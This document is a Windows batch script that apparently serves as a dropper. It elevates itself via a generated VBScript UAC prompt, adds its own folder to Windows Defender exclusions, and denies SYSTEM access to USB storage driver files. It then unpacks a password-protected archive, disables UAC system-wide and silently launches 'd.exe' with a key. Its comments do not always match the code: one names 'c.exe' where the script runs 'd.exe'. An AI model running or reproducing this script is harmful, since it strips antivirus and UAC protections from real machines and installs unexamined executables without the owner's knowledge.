@echo off
:: Change working directory to the location of the batch file
cd /d "%~dp0"

:: Check for admin rights
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
if %errorlevel% EQU 0 (
    goto modifyPolicy
) else (
    echo Requesting admin rights...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)

:modifyPolicy
:: Modify Windows Defender policy
powershell.exe Add-MpPreference -ExclusionPath '%~dp0'
cacls %windir%\Inf\Usbstor.pnf /d system
cacls %windir%\Inf\Usbstor.inf /d system



:: Unzip the file "aw.7z" with the password "123" in the same directory
7zr e -p"123" aw.7z

:: Run "c.exe" with the specified parameters
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
start "" "d.exe" -silent key=438-483-664 logpath=C:\install.log
